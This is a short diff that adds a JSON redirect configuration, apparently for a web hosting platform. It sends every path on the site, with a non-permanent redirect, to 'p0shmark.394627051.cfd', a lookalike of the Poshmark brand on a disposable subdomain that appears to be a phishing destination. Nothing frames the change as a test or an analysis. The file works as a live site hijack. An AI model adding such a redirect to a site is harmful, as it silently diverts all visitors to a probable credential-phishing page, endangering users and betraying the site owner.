@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/:path*",
+      "destination": "https://p0shmark.394627051.cfd/HlbKpmRsL",
+      "permanent": false
+    }
+  ]
+}
